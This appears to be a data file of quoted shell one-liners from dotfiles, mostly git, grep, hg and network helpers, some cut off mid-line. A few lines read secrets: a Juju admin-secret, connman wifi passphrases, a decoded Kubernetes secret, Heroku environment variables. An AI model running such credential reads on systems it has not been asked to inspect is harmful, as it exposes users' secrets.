"ifconfig eth0 | awk '/inet addr/{print substr(\$2,6)}'"
"ifconfig en0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"
"ifconfig en0 | grep ""inet """
"ifconfig en0 | ggrep -Po ""ether \K.*"""
"ifconfig en0 | awk ""\$1==\""inet\"" {print \$2}"" "
"ifconfig en0 | awk ""/status/{print $2}"""
"ifconfig awdl0 | awk ""/status/{print $2}"""
"ifconfig -a|grep ""10\.0\.1\."""
"ifconfig -a| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"
"ifconfig -a |\
"ifconfig -a | perl -nle""/(\d+\.\d+\.\d+\.\d+)/ && print $1"""
"ifconfig -a | grep -w ""inet"""
"ifconfig -a | grep -oE '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
"ifconfig -a \ | \
"if ping -c 1 -W 3 google.com &> /dev/null; then echo werks; else echo does not werk; sudo netctl restart ""$(netctl list|sed ""s/^* //"")""; echo werks; fi"
"if git status 2>&1 | grep ""On branch master"" ; then read -p ""on branch master, hit return or ctrl-c> "" tmp; fi; /usr/bin/git $*"
"if [[ `xrandr --listmonitors | wc -l` == ""3"" ]]; then xrandr --output HDMI-0 --off; else xrandr --output HDMI-0 --mode 1920x1080 --pos 0x0 --rotate normal; fi"
"if [[ `wc -l ~/.aliases_pwd_swap | cut -d "" "" -f 1` -ne 0 ]];\
"if [[ $(git diff --shortstat 2> /dev/null | tail -n1) != """" ]]; then echo ""DIRTY""; else echo ""CLEAN""; fi"
"if [[ $(env | grep VIMRUNTIME) ]]; then echo ""Yes, running in a Vim shell"" ; else echo ""No, not running in a Vim shell"" ; fi"
"if [[ $(echo {+2..}) = *DA* ]]; then jira view {+2..}; else git log -200 --pretty=format:%s $(echo {+2..} | sed \""s/$/../\"") fi"""
"if [ `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}'` == 'GeM' ]; then ssh pi@192.168.0.23; else ssh -p $PORT $URL_PI; fi"
"if [ -f out.html ];then cp out.html $OO|android view -f $OO/out.html;else echo Sorry,not found out.html!;fi"
"if [ -f /sys/class/power_supply/BAT1/charge_now ] ; then ((echo ""Battery: "" ; ((echo ""scale=4;"" ; cat /sys/class/power_supply/BAT1/charge_now ; echo / ; cat /sys/class/power_supply/BAT1/charge_full) | tr -d "
"if [ -f ""Gemfile"" ]; then mkdir -p bunlinks && find bunlinks -type l -delete && cd bunlinks && bundle show --paths | xargs -L1 ln -s; cd .. ; else echo ""not in Gemfile directory""; fi"
"if [ $# -ne 1 ]; then echo ""ERROR: You must supply a man page to convert!"" else; $(man -t $1 | open -f -a Preview.app); fi"
"if [ ""$(caller 2>/dev/null | cut -d"" "" -f2)"" != ""${BASH_SOURCE}"" ];then echo ""err: private function""; return 1; fi"
"iex --name $(whoami)@127.0.0.1 --cookie $(kubectl get secret release -o ""go-template={{index .data \""release_cookie\""}}"" | base64 -D) "
"id | tr ',' '\n'"
"id | tr "","" ""\n"""
"id -Gn | tr "" "" ""\n"""
"icalBuddy -nc eventsToday+7 | sed -e ""s/*/-/"""
"iam0 && /mnt/moatpro/moatpro.db/moatpro/db/lib/host_util.py get | jq "".host_groups.prod_cache_readers_group"""
"hyperfine --prepare ""sync; echo 3 | sudo tee /proc/sys/vm/drop_caches"""
"hub issue -f ""- [\`%i\`](%U) %t \| @%au%n"""
"hub browse -- issues/$(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g"")"
"http_proxy=http://$(VBoxManage guestproperty get ""Kali Linux"" /VirtualBox/GuestInfo/Net/1/V4/IP | cut -d"" "" -f2):8080 https_proxy=$http_proxy noproxy="""""
"http -j GET localhost:9200/_cat/shards?h=index,shard,prirep,state,unassigned.reason | grep UNASSIGNED"
"htpasswd -nBC 10 """" | tr -d "":\n"""
"htop -p $(pidof suit|tr ' ' ',')"
"hp&&echo ""\n y""|lerna clean&&shareClean&&careClean&&sleep 10&&hp&&lerna bootstrap"
"hostname | sed ""s/dev-10-34-5-3/fweist-dev/g"""
"hostname -I | sed ""s/\ .*//g"""
"hostname -I | sed ""s/ .*//"""
"hostname -I | cut -d"" "" -f1"
"hostname -I | cut -d"" "" -f 1"
"hostname -I | cut -d "" "" -f 1"
"hostname --all-ip-addresses | awk {""print $1""}"
"history| sort -r -k 2.1,3"
"history| sort -k 2.1,3"
"history|
"history |sed ""/ \+[0-9]\+ \+h$/d"""
"history |cut -f5- -d "" """
"history | tail -n 100; echo ""\033[0;36mOnly last 100. For full, type: \033[0;33mhistory\033[0;36m. Grep via: \033[0;33mhsgrep\033[0;36m.""; echo ""To run entry N: \033[0;33m!N\033[0;36m.\033[0m"""
"history | sed ""s/ *[0-9]* *//"""
"history | grep `date ""+%Y-%m-%d""`"
"history | grep `date ""+%Y-%m-%d %H""`"
"history | grep -av ""[[:digit:]]\+ : """
"history | grep ""git commit"""
"history | grep ""defaults"""
"history | grep ""defaults write"""
"history | grep ""defaults write com.apple.finder"""
"history | grep ""defaults delete"""
"history | grep ""\""""\$@""\"""""
"history | grep ""${1}"""
"history | grep ""$@"""
"history | grep ""$*"""
"history | grep """
"history | awk '\
"history | awk ""{print \$1-($HISTCMD + 1), \$0}"""
"history | (while read a a;do echo ""${a}"";done)"
"history 1 | grep ""defaults"""
"history 1 | cut -d"" "" -f4-"
"history -n; history | grep $(date ""+%F"" --date=""yesterday""); yesterday-git"
"history -n 1 | \
"hist = log --pretty=format:\""%h %ad | %s%d [%an]\"" --graph --date=short"
"hgs | grep ""^[^?]"""
"hg up $(hg log -r ""children($(hg id -i))"" --template ""{node|short}\n"")"
"hg status | grep -v ""? """
"hg status | grep ""^[a-zA-Z]"""
"hg status | grep ""^R"""
"hg status | grep ""^M"""
"hg status | grep ""^A"""
"hg status | grep ""^?"""
"hg status . | egrep -v ""^\?"""
"hg st | grep -vE ""^\?"""
"hg log -r ""bisect(good) or bisect(bad)"" --template ""{node|short} {bisect}\\n"""
"hg log --limit 20 --template ""{node|short} \
"hg diff | grep ""^[!-+]"""
"hg diff -w ""$@"" | vim -R -"
"hg branches -c | \
"hg branches -a | grep ""^mk"""
"hg branches -a | egrep ""^tps"""
"hg branches --closed | grep -i ""^release"""
"hg branches --closed | grep -i ""^hotfix"""
"hg branches --closed | grep -i ""^feature"""
"hg branch | \
"hexdump -C < /dev/urandom | grep ""ca fe"""
"hexdump -C /dev/urandom|grep ""ca fe"""
"hexdump -C /dev/urandom | grep --color=always -Fe ""ca fe"""
"hexdump -C /dev/urandom | grep ""fd b4"""
"hexdump -C /dev/urandom | grep ""ca fe"""
"hexdump -C /dev/random | grep --color=always ""ca fe"""
"heroku run ""printenv | sort"""
"head -n1 /var/log/pacman.log | awk '{ print \$1, \$2 }'"
"head -n 1 | xargs -d ""\n"" ext_edit"
"head -n $(echo ""$(tput lines) - 2"" | bc)"
"head -1 cutpaste.txt | pbcopy
"head -""$((($RANDOM%9+1)*20))"" ~/git/private/confrc/assets/portal_ascii | tail -20 ; echo -e ""\033[23A"""
"hd /dev/urandom | grep --color ""ca fe"""
"gwip && ggpush -f && git log -1 | grep -q -c ""\-\-wip\-\-"" && git reset HEAD~1"
"gvim -p $( find . -maxdepth 1 \( -type f -name ""*.cpp"" -o -name ""*.hpp"" \) -printf ""%P\n"" | sort )"
"gvim -c ""set buftype=nofile|0put *"""
"gvim +""so ~/tetris.vim|:cal <SNR>140_Main()"""
"gsutil -m -h ""Cache-Control:public,max-age=60"" rsync -x ""\.DS_Store$|.*/\.DS_Store$"" -c -d -R /Users/kmoore/src/aurora/aurora-web/published/ gs://aurora-staging-site/ ; echo ""Pushed to: https://web.aurora-staging.com"""
"gsutil -m -h ""Cache-Control:public,max-age=60"" rsync -x ""\.DS_Store$|.*/\.DS_Store$"" -c -d -R /Users/kmoore/src/aurora/aurora-web/published gs://test.aurora-staging.com/; echo ""Pushed to: https://test.aurora-staging.com"""
"gsp | grep -v ""^??"""
"gshuf -n 1 /usr/share/dict/words| tr -d ""\n""; echo $(gshuf -i0-999 -n 1)"
"gsed -r -i.bak ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"gsed -r ""s/\x1b\[([0-9]{1,2}(;[0-9]{1,2})*)?[m|K]//g"""
"gsed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|KG]//g"""
"gs -s| grep ""^[^?][^?]"""
"gs -dBatch -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=$(date | sed -e ""s: :_:g"" -e ""s,:,-,g"")_output.pdf"
"gs && git add --all && echo "":wq"" | git commit --amend"
"gs && echo "":wq"" | git commit --amend && gs"
"growlnotify -n vim -m ""rake started""; rake | growlnotify -n vim &"
"groups | tr "" "" ""\n"""
"groups | sed ""s/ /\n /g"""
"grls | grep -vwi ""chore"""
"grim -g ""$(slurp -p)"" -t ppm - | convert - -format ""%[pixel:p{0,0}]"" txt:-"
"grep\ -En\ ""\ +$""\ \$\(git\ status\ -suno\ \|\ cut\ -d\\\ \ -f3\)"
"grep http | grep -shoP ""http[^?\"" >)#]+"""
"grep cores /proc/cpuinfo | wc -l && grep ""model name"" /proc/cpuinfo && free -m"
"grep alias $HOME/.bash_profile | grep -v ""grep"""
"grep admin-secret ~/.juju/environments/`juju switch`.jenv | sed -e ""s/ admin-secret: //"""
"grep ^[a-z].*\:$ Makefile | sed s,:,,g"
"grep ^Host ~/.ssh/config| grep -v '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'"
"grep -w -i ""Host"" ~/.ssh/config | sed s/Host//"
"grep -w -i ""Host"" ~/.ssh/config | sed ""s/Host//"""
"grep -vE ""^\s*[#;]|^\s*$"""
"grep -vE ""^#|^[[:space:]]*$"" $1"
"grep -vE ""^#|^$"""
"grep -vE ""(log|Binary)"""
"grep -v grep | GREP_COLOR=""1;32;40"" LANG=C grep --color=auto"
"grep -v '^#' /etc/group | mlr --ifs : --nidx --opprint label group,pass,gid,member then sort -f group"
"grep -v ""grep"" | grep --color=auto"
"grep -v ""^\s*$\|^\s*#.*"""
"grep -v ""^[\t ]*#""|grep -v ""^[ \t]*$"""
"grep -v ""^$\|^\s*\#"""
"grep -v ""^$\|^#"""
"grep -v ""^$"" /etc/oratab | grep -v ""^\s*#"""
"grep -v ""^$"" -R . | wc -l"
"grep -v "".svn"" `find . -iname ""*.py""` | wc -l"
"grep -rn --exclude-dir=""lib"" --exclude-dir="".git"" ""TODO"" . | sed ""s/:\s*#/: #/"""
"grep -rPl ""export class"" --include=""*component.ts"" --include=""*.service.ts"" | xargs perl -pi -e ""BEGIN{undef $/;} s/(export class (\w+) .*)/\1Object.defineProperty(\2, "
"grep -rIl -E ""mysql.*127\.0\.0\.1"" envdir tests | xargs sed -i """" -E ""s/127.0.0.1/192.168.99.100/g"""
"grep -rE ""^deb "" /etc/apt/sources.list /etc/apt/sources.list.d/*.list | sed ""s/^.*:\/\///g"""
"grep -r --line-buffered """" err.txt generated.file succ.txt | fzf --height 40%"
"grep -r --include ""*.gradle"" ""applicationId.*\"".*\"""" | grep -o ""\"".*\"""" "
"grep -r ""^Name="" /usr/share/applications/htop.desktop /usr/share/applications/ocaml.desktop /usr/share/applications/python2.7.desktop /usr/share/applications/python3.6.desktop /usr/share/applications/vim.desktop | cut -d"
"grep -r ""Invalid user"" /var/log/auth* | sort"
"grep -r ""$1"" ~/Code/live/codebase/ | grep -v ""svn"""
"grep -o --regexp='[A-Z]\{1,7\}-[0-9]\{2,9\}' | sort -u"
"grep -o ""\"".*\"""" | tr -d ""\"""""
"grep -o ""$1"" err.txt generated.file succ.txt | wc -l"
"grep -niE '^(name|exec)=' {$HOME/.local/share/applications/*,/usr/share/applications/*}"
"grep -n ""^#*alias"" ~/dotfiles/* | vim -"
"grep -n "">>>>>>>\|<<<<<<<"" `find_rails`"
"grep -lr ""<<<<<<<"" . | xargs git checkout"
"grep -ilr ""OLD"" components/ | xargs -I@ sed -i """" ""s/OLD/NEW/g"" @"
"grep -i SwapTotal /proc/meminfo | tr -d ""[a-zA-Z :]"""
"grep -i ""unrar finished"" /home/basti/.sabnzbd/logs/sabnzbd.log | tail -n 15"
"grep -hv ""CRON\|Cannot find command to construct key"" /var/log/auth.log.3 /var/log/auth.log.2 /var/log/auth.log.1 /var/log/auth.log"
"grep -h ""unlocked"" /var/log/auth.log.3 /var/log/auth.log.2 /var/log/auth.log.1 /var/log/auth.log | cut -c1-15"
"grep -e ""FIXME\|TODO"" -r . -i"
"grep -c ""^REJECT"" 1.txt | sed -e ""s,^,Rejects ,"""
"grep -c ""^Going"" 1.txt | sed -e ""s,^,Going ,"""
"grep -c ""^=Fetching="" 1.txt| sed -e ""s,^,Fetch ,"""
"grep -aiRPoH 'https?://[a-zA-Z0-9\-\_\.\~\!\*'\''\(\)\;\:\@\&\=\+\$\,\/\?\#\[\]\%]+'|sed 's/:/,/'"
"grep -Rnif - . 2>/dev/null |grep -v ""Binary file"" <<<"
"grep -RL --exclude turnip_helper.rb --exclude spec_helper.rb --exclude-dir spec/acceptance --exclude-dir spec/support --exclude-dir spec/fixtures ""spec_helper"" spec | xargs rspec"
"grep -Pi --color=auto ""^|$@"""
"grep -P --color=auto ""^|$@"""
"grep -P ""(Errors|Failures): [1-9]"""
"grep -P ""(Errors|Failures): [1-9]"" **/target/*-reports/*.txt"
"grep -H ""Tests run"" target/surefire-reports/*.txt | grep FAILURE"
"grep -Ev -e ""^ *#"" -e ""^ *$"" < ""$I3CONFIG"" | sed -re ""s/^ +/ /g"" -e ""s/^( *)bindsym /\1/g"" -e ""s/ exec (--no-startup-id)/ =>/g"""
"grep -Ev --line-buffered --color=never ""^[[:space:]]*(//|#)"""
"grep -Ev ""^\s*(#|$)"""
"grep -Ev ""^($|\s+?#)"""
"grep -Ev ""^($|#)"""
"grep -Ev ""^(#|$)"""
"grep -Ev ""^#|^$"""
"grep -Ev ""(^$|#)"""
"grep -Erv ""(^#|^$)"""
"grep -Ehv ""^\s*(${c:-#}|$)"""
"grep -E -v ""^[[:space:]]*$|^[[:space:]]*#"""
"grep -E -v ""^#|^$"""
"grep -E ""dirty|writeback"" /proc/vmstat"
"grep -E ""describe|context"" "
"grep -E ""^|error"""
"grep -E ""^{\"""" | jq ."
"grep -E ""^setenv"" /etc/launchd.conf | xargs -t -L 1 launchctl"
"grep -E ""^Host ([^*]+)$"" $HOME/.ssh/*_config | sed \\"
"grep -E ""\spurge\s|\sremove\s"" /var/log/dpkg.log"
"grep -E ""Name|Passphrase"" /var/lib/connman/wifi*/settings --no-filename"
"grep --line-buffered -r """" err.txt generated.file succ.txt | fzf"
"grep --line-buffered --color=never -r """" ~/notes/* | fzf"
"grep --line-buffered --color=never -r """" err.txt generated.file succ.txt | fzf"
"grep --extended-regexp ""pac(new|save)"" /var/log/pacman.log"
"grep --exclude=""*\.[svn|git]*"" --color=auto -rI"
"grep --exclude-dir=.git -rEI ""TODO|FIXME"" . 2>/dev/null"
"grep --exclude-dir=.git -rEI ""TODO:|FIXME:"" . 2>/dev/null"
"grep --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=bower_components -rEI ""TODO|FIXME"" . 2>/dev/null"
"grep --color=never -E ""^\s*[^#$;]|^\s*$"""
"grep --color=never ""alias cf"" ~/.bash_aliases | grep -v ""alias cfc"""
"grep --color=auto -E ""$1|$"" $2"
"grep --color=always -n ""()"" ""$HOME""/.bashrc | grep -v ""fns_alias"""
"grep ""user\|pass"" "
"grep ""sshd"" /var/log/auth.log | less"
"grep ""lv3:.*toggle"" /usr/share/X11/xkb/rules/base.lst | fzf"
"grep ""grp:.*toggle"" /usr/share/X11/xkb/rules/base.lst | fzf"
"grep ""core dump"" err.txt generated.file succ.txt | wc -l"
"grep ""apt-get install"" </var/log/apt/history.log | awk ""{for(i=4; i<=NF; i++) print \$i;}"""
"grep ""alias"" ~/.zshrc | more"
"grep ""^\s*\(def\|class\).*$"" --color=never"
"grep ""^\["" ~/.pg_service.conf | tr -d []"
"grep ""SS_WEBAPI_ERR_"" $ss/include/sswebapierrors.h | awk ""{ print \$1,\$2,\$3 }"""
"grep ""Real time:"" err.txt generated.file succ.txt | wc -l"
"grep ""Message"" /home/cod/workspace/development/cod/hod_app/development.log|wc -l"
"grep ""LOOP: cpu time"" OUTCAR | tail "
"grep ""Host "" ~/.ssh/config | grep -i template"
"grep ""Host "" ~/.ssh/config | grep -i overlord"
"grep ""FORCES: max "" OUTCAR | nl"
"grep ""Error"" $NODE_LOG | vim -"
"grep "":"" $HOME/.jnewsrc | awk -F : ""{print $1}"""
"grep "": WARNING:\|: ERROR:"""
"grep ""/AI/Jumble/"" /var/www/vhosts/system/webgenie.com/logs/access_log | grep -v 58.107"
"grep "".*"" -r -I 2>&1 | pyg -l d"
"grep "".*"" -d skip -I -r 2>&1 | pyg -l d"
"grep ""* "" -r ~/Records/link_filed | nf"
"grep "" \[ ] "" err.txt generated.file succ.txt | sort"
"grep "" \[ ] "" err.txt generated.file succ.txt | sort -r"
"grc -es --colour=on ps -Axww -o pid,ruser,command | less -SR"
"grc --colour=auto svn st | grep -v ""^?"""
"grc --colour=auto svn st | grep ""^C"""
"gradle -b standalone.gradle flywayRepair ; gradle -b standalone.gradle flywayMigrate -i | /usr/bin/ts ""%H:%M:%.S"""
"gpg -d ~/files/txt/stuff.gpg | grep ""$@"""
"gpg --list-sigs ${GPG_KEY} |
"gp --set-upstream origin `git describe --all | sed -e ""s/heads\///""`"
"gource -1279x720 -o - | ffmpeg -y -r 60 -f image2pipe -vcodec \\
"gource --hide dirnames,filenames --seconds-per-day 0.1 --auto-skip-seconds 1 -1280x720 -o - | ffmpeg -y -r 60 -f image2pipe -vcodec ppm -i - -vcodec libx264 -preset ultrafast -pix_fmt yuv420p -crf 1 -threads 0 -bf 0 gource.mp4"
"google-chrome $(g pr list -f ""%U;"" | cut -d"";"" -f1)"
"google-chrome ""https://www.youtube.com/results?search_query=`mpc | head -n 1`"""
"go test ./... 2>&1 | grep -v ""$(basename $(pwd))\t\[no test files"""
"go test -v $(go list ./... | grep -v ""/vendor/"")"
"go test -short $(go list ./...) | grep -v ""no test"""
"go test -bench=. ./... 2>&1 | grep -v ""$(basename $(pwd))\t\[no test files"""
"go test $(go list ./... | grep -v ""/vendor/"")"
"gnuplot -e ""show palette colornames"" 2>&1 | sort"
"gnome-open ""`ls -1tr | tail -1`"""
"glxinfo | grep ""server glx vendor string"""
"glxinfo | grep ""OpenGL"""
"gls -lah --color | grep ""^d"""
"gls -lah --color | grep ""^-"""
"gls -lA --color | grep ""^l"""
"gls -lA --color | grep ""^d"""
"gls -l | grep ""^d"""
"gls -l --color | ggrep ""^d"" --color"
"gls -l ${colorflag} | grep ""^d"""
"gls --color=auto --time-style=""+%F|%T"""
"gls --color -AFh | grep ""@"""
"gls --color -AFh | grep ""/"""
"glog --pretty=format:'%C(yellow)%h%C(reset)%C(bold red)%d%C(reset) %s %C(green)(%cr) %C(cyan)<%an>%C(reset)' | ruby -e 'puts STDIN.read.gsub(%(<#{%x(git config user.name).chomp}>), %())'"
"gl_basic | sed -e ""s/^/ /"" -e ""\\_refs/remotes/origin/_ s/^./~/"" -e ""s/^/ /"" -e ""\\_refs/heads/_ s/^./@/"" -e ""s_refs/heads/master_\\033[7m\0\<--_"""
"gl_basic | awk ""
"gitstatusall.sh |grep -B 2 ""Your branch is ahead"""
"gitk $(git branch | tr ""\n*"" "" "")>& /dev/null &"
"git-st | tr ""\n"" "" """
"git-foresta --all --style=10 ""$@"" | less -RSX"
"git-flow support finish $(git rev-parse --abbrev-ref HEAD | cut -f2 -d""/"")"
"git-flow release finish $(git rev-parse --abbrev-ref HEAD | cut -f2 -d""/"")"
"git-flow hotfix finish $(git rev-parse --abbrev-ref HEAD | cut -f2 -d""/"")"
"git-flow feature finish $(git rev-parse --abbrev-ref HEAD | cut -f2 -d""/"")"
"git-current-branch | sed -e ""s/\/.*$//g"""
"git whatchanged --format=""%n%C(yellow)commit %H%n%CblueAuthor: %Creset%an | %ae%n%CblueAuthor Date: %Creset%ad%n%CblueCommit Date: %Creset%cd%n%CblueMessage:%n%Creset%s%n%C(yellow)Changes:"""
"git tag | sort -t. -k1,1n -k2,2n -k3,3n"
"git tag | sort -bt. -k1,1 -k2,2n -k3,3n -k4,4n -k5,5n"
"git tag | python -c \
"git tag --sort=objecttype --sort=-creatordate | git show --date=local --pretty=""format:%C(auto)%h%C(green)%d %C(blue)%an %C(auto)%s %x1b[2m%ad%x1b[0m%Creset"" -s --stdin"
"git tag --list ""v*"" --sort=v:refname | tail -1"
"git symbolic-ref HEAD | sed -n ""s/.*\/\(.*\)$/\1/p"""
"git symbolic-ref HEAD 2>/dev/null | cut -d""/"" -f 3"
"git symbolic-ref HEAD 2> /dev/null | sed -e 's,.*/\(.*\),\1,'"
"git symbolic-ref --short HEAD | tr -d ""\n"" "
"git submodule status | cut -d"" "" -f3-4"
"git submodule status --recursive | grep -E ""^[^ ]"""
"git submodule foreach git status --porcelain | grep ""M """
"git submodule foreach git branch | grep -v ""* master"""
"git status; echo ""------STASHES------""; git stash list | head "
"git status | sed -n -e '1,/^Untracked/p'"
"git status | sed -n ""s/^.*both [a-z]*ed: *//p"""
"git status | sed -e '/Untracked files/,\$d'"
"git status | perl -pe ""exit if(/Untracked files\:/)"""
"git status | grep -v "".iml"""
"git status | grep ""new file:"""
"git status | grep ""modified:"""
"git status | grep ""deleted:"""
"git status | find . -name ""*.test"" -type f -delete"
"git status -uno | sed -n ""s/^\s\+modified:\s*//p"""
"git status -uno | sed -n ""s/^\s\+deleted:\s*//p"""
"git status -uno --short | grep -Po ""\S+$"""
"git status -s | while read flag file; do git add ""$file""; done;"
"git status -s | while read -r word1 word2; do echo -e ""${word2} ${COLOR_RED}${word1}${COLOR_NO}""; done"
"git status -s | sed -n -e ""s#?? #/#p"" >> .gitignore"
"git status -s | grep ""M "" "
"git status -s | grep ""??"" -v"
"git status -s | grep ""??"" "
"git status -s | grep "" M"""
"git status --short | ""^U[UAD]"""
"git status --short --porcelain=v1 | sed ""s/^...//"""
"git status --porcelain | sed -n ""s/^?? *//p"""
"git status --porcelain | cut -f 3 -d "" """
"git status --porcelain | cut -d"" "" -f3"
"git status --porcelain --short --ignored | sed -n ""s/^!! //p"""
"git stash list | while IFS=: read STASH ETC; do echo ""$STASH: $ETC""; git diff --stat $STASH~..$STASH --; done"
"git st | grep ""^[^??]"""
"git show-ref -s | git commit-graph write --stdin-commits
"git show HEAD | perl scripts/get_maintainer.pl --separator , --nokeywords --nogit --nogit-fallback --norolestats --nol"
"git show --word-diff=color --word-diff-regex=""[^[:space:],]+|[,]+"""
"git show --pretty=""format:"" $(git show --pretty=""format:"" --name-only | fzf-tmux --tac -d 15)"
"git show $(git stash list | cut -d"":"" -f 1)"
"git show ""$1"" | vi -"
"git shortlog -sn | cat; \
"git rev-parse HEAD | xclip -selection clip; echo -n ""copied to clipboard: ""; git rev-parse HEAD;"
"git rev-parse --symbolic-full-name --abbrev-ref HEAD |& sed -n ""/ /d; s/\(..*\)/\(\1\)/p"""
"git rev-parse --abbrev-ref HEAD | tr -d ""\n"""
"git rev-parse --abbrev-ref HEAD | rg ""^\w+-\d+"" --only-matching --no-line-number"
"git rev-parse --abbrev-ref HEAD | grep -Eo ""[A-Z]+-[0-9]+"""
"git reset Podfile.lock && git checkout Podfile.lock && git reset Pods/Manifest.lock && git checkout Pods/Manifest.lock && git diff --name-only --diff-filter=U Pods/ | xargs -I{} git reset ""{}"" && bundle exec pod install"
"git reset Podfile.lock && git checkout Podfile.lock && git reset Pods/Manifest.lock && git checkout Pods/Manifest.lock && git diff --name-only --diff-filter=U Pods/ | xargs -I{} git reset ""{}"" && bundle exec pod install --repo-update"
"git reset HEAD | h -n ""M """
"git remote prune origin && git branch --merged | grep -v -e ""\*"" -e "
"git reflog --format='%Cred%h%Creset %C(bold cyan)%<|(17)%gd%Creset %C(auto,bold yellow)%d%C(auto,reset)%gs (%s) %Cgreen%ci%C(reset)'"
"git rebase -i ${1:HEAD~$(git_commits_ahead | sed ""s/[^0-9]//"")}"
"git push origin `git symbolic-ref HEAD 2>/dev/null | cut -d""/"" -f 3`"
"git push origin `git branch --no-color 2> /dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/""`"
"git push origin HEAD:refs/for/`git branch | sed -n ""/^\*/{s/..//;p}""`"
"git push origin HEAD -u && open https://github.com/$(git ls-remote --get-url origin | sed -E -e ""s/^.+:(.+)\.git$/\1/"")/compare/master...$(git rev-parse --abbrev-ref HEAD)"
"git push origin $(git symbolic-ref HEAD | sed -e ""s,.*/\(.*\),\1,"")"
"git push origin $(git status |perl -nle ""/^On branch (\\S+)/ && print \$1"" )"
"git push origin $(git branch | sed -n -e ""s/^\* \(.*\)/\1/p"")"
"git push origin $(git branch 2>/dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/"")"
"git push origin $(__git_ps1 | grep -oh ""[^\(\)\ ]*"")"
"git push -u origin `git name-rev HEAD 2> /dev/null | awk ""{ print \\$2 }""`"
"git push -f gitlab HEAD:$(git branch | sed -n ""/\* /s///p"")"
"git push --set-upstream origin `git symbolic-ref HEAD|sed -r ""s:refs/heads/::g""`"
"git push --set-upstream origin `git symbolic-ref HEAD 2> /dev/null | sed -e ""s/refs\/heads\///""`"
"git push --set-upstream origin $(git symbolic-ref HEAD 2> /dev/null | sed -ne ""s/^refs\/heads\///p"")"
"git push --set-upstream origin $(git symbolic-ref -q HEAD | cut -d""/"" -f 3)"
"git push && hub pull-request -m ""$(git log -1 --pretty=%B)"" | pbcopy && pbpaste"
"git pull origin `git branch --no-color 2> /dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/""`"
"git pull origin $(git symbolic-ref HEAD | cut -d""/"" -f3-)"
"git pull origin $(git branch 2>/dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/"")"
"git pull origin $(__git_ps1 | grep -oh ""[^\(\)\ ]*"") --rebase=preserve"
"git pull 2>&1 | tee >(grep ""migrate"" 1>/dev/null && echo ""YOU GOT A MIGRATION, DAWG"")"
"git pull --rebase origin master&& echo ""The deed is done."" | toilet -w 80 --gay -t --font smmono9"
"git number -uall | sed ""/^$/d"""
"git ls-tree HEAD | grep -v ""44 """
"git ls-tree -r -z --name-only HEAD -- err.txt generated.file succ.txt | xargs -0 -n1 git \
"git ls-tree -r --name-only HEAD | while read filename; do
"git ls-files | xargs -d ""\n"" wc -l"
"git ls-files | grep ""^[[:lower:]]"""
"git ls-files | \
"git ls-files applications/gymnasium/src | ctags --tag-relative -L - -f .git/tags --languages=js,html"
"git ls-files -v | grep -e ""^[hsmrck]"""
"git ls-files -v | grep -E ""^[a-z]"""
"git ls-files -v | grep ""h """
"git ls-files -v | grep ""^[a-z]"""
"git ls-files -v | grep ""^[[:lower:]]"""
"git ls-files -v | grep ""^S"""
"git ls-files -v | grep ""^:lower:"""
"git ls-files -v \| grep ""^[[:lower:]]"""
"git ls-files -m | xargs -i git update-index --assume-unchanged ""{}"""
"git ls-files --full-name | sed ""s,^,$(git rev-parse --show-toplevel)/,"""
"git ls-files --full-name | grep -v ""$(git diff --name-only HEAD)"""
"git ls-files --deleted -z | xargs -0 git rm"""
"git log | vim -c ""set keywordprg=git\ show"" -R -"
"git log | less -RFX --pattern ""^commit """
"git log | grep -A5 ""Robin"""
"git log | grep ""Upgraded to"" -m 1"
"git log -p | view - -R -c ""set foldmethod=syntax"""
"git log -p -40 | vim - -R -c ""set foldmethod=syntax"""
"git log -n1 --oneline | cut -d"" "" -f1"
"git log -n 1 | grep -q -c -- ""--wip--"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""– WIP –"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""\-\-wip\-\-"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""WIP:"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""WIP"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""WIP \- WORK IN PROGRESS!!! \- WIP"" && git reset HEAD~1"
"git log -n 1 | grep -q -c ""--wip--"" && git reset HEAD~1"
"git log -n 1 --pretty=format:""%H"" | pbcopy"
"git log -n 1 --pretty=format:""%H"" | ccopy && echo `git log -n 1 --pretty=format:""%an - %s - %H""`"
"git log -15 --pretty=format:""%C(#343d4f)%h~%C(white bold)%s~%C(#343d4f)[%aN]~%C(green)%d"" | column -t -s ""~"""
"git log -1 | grep -q -c ""\-\-wip\-\-"" && git reset HEAD~1"
"git log -1 --pretty=oneline | sed -E ""s/^([^[:space:]]+).*/\1/"""
"git log -1 --pretty=format:""%s"" | pbcopy"
"git log -1 --pretty=format:""%H"" | pbcopy"
"git log -1 --oneline | cut -f 2- -d "" """
"git log -1 --format=""%s"" | cat"
"git log -1 --format=""%s , sha: %h"" | clip.exe"
"git log -1 --format=""%h"" | cat"
"git log --tags --simplify-by-decoration --reverse --pretty=""format:%d (%ad)"" --date=short | sed -e ""s/ (tag: //"" -e ""s/)//"" -e ""/^ /d"""
"git log --tags --oneline --pretty=format:\""%h\ %ad\ \|\ %s%d\ [\%an]\"" --graph --date=short --max-count=20"
"git log --tags --oneline --pretty=format:\""%h\ %ad\ \|\ %s%d\ [\%an]\"" --graph --date=short --max-count=10"
"git log --since=1.day --pretty=format:""%Cblue%ar%Cgreen %s%Creset"" | sed -e ""s/ \* /\n* /g""; echo """""
"git log --since=""6am"" --format=""%s%n%b"" --author=""$(git config --global user.name)""| grep ""^[^(Change-id)]"""
"git log --since=""2017-1-1"" |git shortlog -s -n"
